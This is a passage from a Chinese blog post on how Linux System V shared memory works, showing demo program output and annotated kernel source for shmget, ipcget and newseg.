class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./shmem</span><br><span class="line"></span><br><span class="line">------------ 共享内存段 -------------- <span class="comment">/* 初始状态 */</span></span><br><span class="line">键        shmid      拥有者  权限     字节     连接数  状态      </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">4</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">7</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">11</span>         yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"></span><br><span class="line">Create shared-memory: <span class="number">13</span></span><br><span class="line"></span><br><span class="line">------------ 共享内存段 -------------- <span class="comment">/* shmget新创建的共享内存段(shmid==13) */</span></span><br><span class="line">键        shmid      拥有者  权限     字节     连接数  状态      </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">4</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">7</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">11</span>         yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">13</span>         yhellow    <span class="number">666</span>        <span class="number">2048</span>       <span class="number">0</span>                       </span><br><span class="line"></span><br><span class="line">Child: Attach shared-memory addr: <span class="number">0x7fe24a52d000</span></span><br><span class="line"></span><br><span class="line">------------ 共享内存段 -------------- <span class="comment">/* 子进程连接该共享内存段,使其[连接数]加一 */</span></span><br><span class="line">键        shmid      拥有者  权限     字节     连接数  状态      </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">4</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">7</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">11</span>         yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">13</span>         yhellow    <span class="number">666</span>        <span class="number">2048</span>       <span class="number">1</span>                       </span><br><span class="line"></span><br><span class="line">Child: Wait <span class="keyword">for</span> enable data...</span><br><span class="line">Parent: Attach shared-memory addr: <span class="number">0x7fe24a52d000</span></span><br><span class="line"></span><br><span class="line">Input some <span class="built_in">string</span>:(Parent)</span><br><span class="line">yhellow <span class="comment">/* 在父进程上的输入 */</span></span><br><span class="line"></span><br><span class="line">------------ 共享内存段 -------------- <span class="comment">/* 父进程连接该共享内存段,使其[连接数]加一 */</span></span><br><span class="line">键        shmid      拥有者  权限     字节     连接数  状态      </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">4</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">7</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">11</span>         yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">13</span>         yhellow    <span class="number">666</span>        <span class="number">2048</span>       <span class="number">2</span>                       </span><br><span class="line"></span><br><span class="line">Parent: Deattach shared-memory</span><br><span class="line"></span><br><span class="line">------------ 共享内存段 -------------- <span class="comment">/* 父进程断开该共享内存段,使其[连接数]减一 */</span></span><br><span class="line">键        shmid      拥有者  权限     字节     连接数  状态      </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">4</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">7</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">11</span>         yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">13</span>         yhellow    <span class="number">666</span>        <span class="number">2048</span>       <span class="number">1</span>                       </span><br><span class="line"></span><br><span class="line">Child: Shared-memory :yhellow <span class="comment">/* 在子进程上的输出 */</span></span><br><span class="line"></span><br><span class="line">Child: Deattach shared-memory</span><br><span class="line"></span><br><span class="line">------------ 共享内存段 -------------- <span class="comment">/* 子进程断开该共享内存段,使其[连接数]减一 */</span></span><br><span class="line">键        shmid      拥有者  权限     字节     连接数  状态      </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">4</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">7</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">11</span>         yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">13</span>         yhellow    <span class="number">666</span>        <span class="number">2048</span>       <span class="number">0</span>                       </span><br><span class="line"></span><br><span class="line">Delete shared-memory</span><br><span class="line"></span><br><span class="line">------------ 共享内存段 -------------- <span class="comment">/* shmctl销毁了指定的共享内存段 */</span></span><br><span class="line">键        shmid      拥有者  权限     字节     连接数  状态      </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">4</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">7</span>          yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"><span class="number">0x00000000</span> <span class="number">11</span>         yhellow    <span class="number">600</span>        <span class="number">524288</span>     <span class="number">2</span>          目标       </span><br><span class="line"></span><br><span class="line">Finished</span><br></pre></td></tr></table></figure>
<p><strong>Linux 中 shm 的实现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee11fc</span> &lt;shmget+<span class="number">12</span>&gt;       syscall  &lt;SYS_shmget&gt;</span><br><span class="line">       key: <span class="number">0x7a05274f</span></span><br><span class="line">       size: <span class="number">0x2800</span></span><br><span class="line">       shmflg: <span class="number">0x3b6</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*getnew)(struct ipc_namespace *, struct ipc_params *);</span><br><span class="line">	<span class="keyword">int</span> (*associate)(struct kern_ipc_perm *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*more_checks)(struct kern_ipc_perm *, struct ipc_params *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> size, <span class="keyword">int</span> shmflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">shm_ops</span> =</span> &#123;</span><br><span class="line">		.getnew = newseg,</span><br><span class="line">		.associate = security_shm_associate,</span><br><span class="line">		.more_checks = shm_more_checks,</span><br><span class="line">	&#125;; <span class="comment">/* 初始化&quot;创建例程&quot; */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_params</span> <span class="title">shm_params</span>;</span></span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns; <span class="comment">/* 获取当前IPC命名空间 */</span></span><br><span class="line"></span><br><span class="line">	shm_params.key = key; <span class="comment">/* 键值 */</span></span><br><span class="line">	shm_params.flg = shmflg; <span class="comment">/* 标识符 */</span></span><br><span class="line">	shm_params.u.size = size; <span class="comment">/* 大小 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipcget(ns, &amp;shm_ids(ns), &amp;shm_ops, &amp;shm_params); <span class="comment">/* 核心函数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ipcget</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (params-&gt;key == IPC_PRIVATE) <span class="comment">/* 是否私有 */</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_new(ns, ids, ops, params); <span class="comment">/* 创建一个新的ipc对象 */</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_public(ns, ids, ops, params); <span class="comment">/* 获取一个ipc对象或创建一个新对象 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ipcget_public</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// *ns: ipc命名空间</span></span><br><span class="line">    <span class="comment">// *ids: ipc标识符集</span></span><br><span class="line">    <span class="comment">// *ops: 要调用的实际创建例程</span></span><br><span class="line">    <span class="comment">// *params: 它的参数</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> *<span class="title">ipcp</span>;</span></span><br><span class="line">	<span class="keyword">int</span> flg = params-&gt;flg;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Take the lock as a writer since we are potentially going to add</span></span><br><span class="line"><span class="comment">	 * a new entry + read locks are not &quot;upgradable&quot;</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	down_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	ipcp = ipc_findkey(ids, params-&gt;key); <span class="comment">/* 通过key值查找一个ids对象 */</span></span><br><span class="line">	<span class="keyword">if</span> (ipcp == <span class="literal">NULL</span>) &#123; </span><br><span class="line">		<span class="keyword">if</span> (!(flg &amp; IPC_CREAT)) <span class="comment">/* IPC_CREAT:如果内核中不存在键值与key相等的共享内存,则新建一个共享内存 */</span></span><br><span class="line">			err = -ENOENT;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			err = ops-&gt;getnew(ns, params); <span class="comment">/* 新建一个共享内存 */</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (flg &amp; IPC_CREAT &amp;&amp; flg &amp; IPC_EXCL) <span class="comment">/* IPC_CREAT|IPC_EXCL:如果存在key值相同的共享内存则报错 */</span></span><br><span class="line">			err = -EEXIST;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			err = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (ops-&gt;more_checks)</span><br><span class="line">				err = ops-&gt;more_checks(ipcp, params);</span><br><span class="line">			<span class="keyword">if</span> (!err)</span><br><span class="line">				<span class="comment">/* ipc_check_perms returns the IPC id on success */</span></span><br><span class="line">				err = ipc_check_perms(ns, ipcp, ops, params); </span><br><span class="line">		&#125;</span><br><span class="line">		ipc_unlock(ipcp);</span><br><span class="line">	&#125;</span><br><span class="line">	up_write(&amp;ids-&gt;rwsem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前面这些可以说是 “共享内存”，“信号量”，“消息队列” 的通用部分，只是 <code>ipc_ops</code> 结构体的初始化不同</li>
<li>这里其实运用了面向对象的思想，用一系列函数和数据结构来描述 IPC 这个类（只是没法单独定义为一个类而已）</li>
<li>函数 <code>newseg</code> 的源码如下：（创建一个新的共享内存）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newseg</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// *ns: 命名空间</span></span><br><span class="line">    <span class="comment">// *params: 指向包含key和msgflg的结构体(ipc_params)</span></span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> shmflg = params-&gt;flg;</span><br><span class="line">	<span class="keyword">size_t</span> size = params-&gt;u.size;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">shmid_kernel</span> *<span class="title">shp</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> numpages = (size + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">13</span>];</span><br><span class="line">	<span class="keyword">vm_flags_t</span> acctflag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt; SHMMIN || size &gt; ns-&gt;shm_ctlmax)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (numpages &lt;&lt; PAGE_SHIFT &lt; size)</span><br><span class="line">		<span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ns-&gt;shm_tot + numpages &lt; ns-&gt;shm_tot ||</span><br><span class="line">			ns-&gt;shm_tot + numpages &gt; ns-&gt;shm_ctlall)</span><br><span class="line">		<span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line">	shp = kvmalloc(<span class="keyword">sizeof</span>(*shp), GFP_KERNEL); <span class="comment">/* 为shmid_kernel分配内核堆空间 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!shp))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	shp-&gt;shm_perm.key = key; <span class="comment">/* 设置shmid_kernel-&gt;shm_perm(参数) */</span></span><br><span class="line">	shp-&gt;shm_perm.mode = (shmflg &amp; S_IRWXUGO);</span><br><span class="line">	shp-&gt;mlock_user = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	shp-&gt;shm_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">	error = security_shm_alloc(&amp;shp-&gt;shm_perm); <span class="comment">/* 将shmid_kernel添加到消息队列基数树中,并取回基数树id */</span></span><br><span class="line">	<span class="keyword">if</span> (error) &#123;</span><br><span class="line">		kvfree(shp);</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(name, <span class="string">&quot;SYSV%08x&quot;</span>, key); <span class="comment">/* PS:在GDB中使用&quot;vmmap&quot;命令就可以看到name */</span></span><br><span class="line">	<span class="keyword">if</span> (shmflg &amp; SHM_HUGETLB) &#123; <span class="comment">/* SHM_HUGETLB:大页面映射 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hstate</span> *<span class="title">hs</span>;</span></span><br><span class="line">		<span class="keyword">size_t</span> hugesize;</span><br><span class="line"></span><br><span class="line">		hs = hstate_sizelog((shmflg &gt;&gt; SHM_HUGE_SHIFT) &amp; SHM_HUGE_MASK); <span class="comment">/* 生成状态日志 */</span></span><br><span class="line">		<span class="keyword">if</span> (!hs) &#123;</span><br><span class="line">			error = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> no_file;</span><br><span class="line">		&#125;</span><br><span class="line">		hugesize = ALIGN(size, huge_page_size(hs)); <span class="comment">/* 对齐 */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* hugetlb_file_setup applies strict accounting */</span></span><br><span class="line">		<span class="keyword">if</span> (shmflg &amp; SHM_NORESERVE)</span><br><span class="line">			acctflag = VM_NORESERVE;</span><br><span class="line">		file = hugetlb_file_setup(name, hugesize, acctflag,</span><br><span class="line">				  &amp;shp-&gt;mlock_user, HUGETLB_SHMFS_INODE,</span><br><span class="line">				(shmflg &gt;&gt; SHM_HUGE_SHIFT) &amp; SHM_HUGE_MASK); <span class="comment">/* 启用严格记账 */</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Do not allow no accounting for OVERCOMMIT_NEVER, even</span></span><br><span class="line"><span class="comment">		 * if it&#x27;s asked for.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span>  ((shmflg &amp; SHM_NORESERVE) &amp;&amp;</span><br><span class="line">				sysctl_overcommit_memory != OVERCOMMIT_NEVER)</span><br><span class="line">			acctflag = VM_NORESERVE;</span><br><span class="line">		file = shmem_kernel_file_setup(name, size, acctflag); <span class="comment">/* 会在shmem文件系统里面创建一个文件 */</span></span><br><span class="line">        <span class="comment">/* 会创建新的shmem文件对应的dentry和inode,并将它们两个关联起来,然后分配一个struct file结构来表示新的shmem文件 */</span></span><br><span class="line">	&#125;</span><br><span class="line">	error = PTR_ERR(file);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(file))</span><br><span class="line">		<span class="keyword">goto</span> no_file;</span><br><span class="line"></span><br><span class="line">	shp-&gt;shm_cprid = get_pid(task_tgid(current)); <span class="comment">/* 获取pid */</span></span><br><span class="line">	shp-&gt;shm_lprid = <span class="literal">NULL</span>;</span><br><span class="line">	shp-&gt;shm_atim = shp-&gt;shm_dtim = <span class="number">0</span>;</span><br><span class="line">	shp-&gt;shm_ctim = ktime_get_real_seconds();</span><br><span class="line">	shp-&gt;shm_segsz = size;</span><br><span class="line">	shp-&gt;shm_nattch = <span class="number">0</span>;</span><br><span class="line">	shp-&gt;shm_file = file;</span><br><span class="line">	shp-&gt;shm_creator = current;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ipc_addid() locks shp upon success. */</span></span><br><span class="line">	error = ipc_addid(&amp;shm_ids(ns), &amp;shp-&gt;shm_perm, ns-&gt;shm_ctlmni); <span class="comment">/* 新创建的shmid_kernel结构挂到shm_ids里面的基数树上 */</span></span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> no_id;</span><br><span class="line"></span><br><span class="line">	list_add(&amp;shp-&gt;shm_clist, &amp;current-&gt;sysvshm.shm_clist); <span class="comment">/* 插入shm链表 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * shmid gets reported as &quot;inode#&quot; in /proc/pid/maps.</span></span><br><span class="line"><span class="comment">	 * proc-ps tools use this. Changing this will break them.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	file_inode(file)-&gt;i_ino = shp-&gt;shm_perm.id;</span><br><span class="line"></span><br><span class="line">	ns-&gt;shm_tot += numpages;</span><br><span class="line">	error = shp-&gt;shm_perm.id;</span><br><span class="line"></span><br><span class="line">	ipc_unlock_object(&amp;shp-&gt;shm_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">no_id:</span><br><span class="line">	ipc_update_pid(&amp;shp-&gt;shm_cprid, <span class="literal">NULL</span>);</span><br><span class="line">	ipc_update_pid(&amp;shp-&gt;shm_lprid, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (is_file_hugepages(file) &amp;&amp; shp-&gt;mlock_user)</span><br><span class="line">		user_shm_unlock(size, shp-&gt;mlock_user);</span><br><span class="line">	fput(file);</span><br><span class="line">	ipc_rcu_putref(&amp;shp-&gt;shm_perm, shm_rcu_free); <span class="comment">/* 释放目标 */</span></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">no_file:</span><br><span class="line">	call_rcu(&amp;shp-&gt;shm_perm.rcu, shm_rcu_free);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>接下来看一下 <code>shmem_kernel_file_setup</code> 生成文件的过程：（新创建的 <code>struct file</code> 则专门用于做内存映射）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct file *<span class="title">shmem_kernel_file_setup</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">loff_t</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __shmem_file_setup(shm_mnt, name, size, flags, S_PRIVATE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">shmem_file_setup</span>(<span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>, <span class="title">loff_t</span> <span class="title">size</span>,</span></span><br><span class="line"><span class="class">				       <span class="title">unsigned</span> <span class="title">long</span> <span class="title">flags</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">i_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">res</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(mnt))</span><br><span class="line">		<span class="keyword">return</span> ERR_CAST(mnt);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt; <span class="number">0</span> || size &gt; MAX_LFS_FILESIZE)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (shmem_acct_size(flags, size))</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	inode = shmem_get_inode(mnt-&gt;mnt_sb, <span class="literal">NULL</span>, S_IFREG | S_IRWXUGO, <span class="number">0</span>,</span><br><span class="line">				flags); <span class="comment">/* 分配一个inode并进行一系列的初始化设置 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!inode)) &#123;</span><br><span class="line">		shmem_unacct_size(flags, size);</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOSPC);</span><br><span class="line">	&#125;</span><br><span class="line">	inode-&gt;i_flags |= i_flags;</span><br><span class="line">	inode-&gt;i_size = size;</span><br><span class="line">	clear_nlink(inode);	<span class="comment">/* It is unlinked */</span></span><br><span class="line">	res = ERR_PTR(ramfs_nommu_expand_for_mapping(inode, size));</span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR(res))</span><br><span class="line">		res = alloc_file_pseudo(inode, mnt, name, O_RDWR,</span><br><span class="line">				&amp;shmem_file_operations); <span class="comment">/* 基于inode分配一个file(伪) */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(res))</span><br><span class="line">		iput(inode);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span 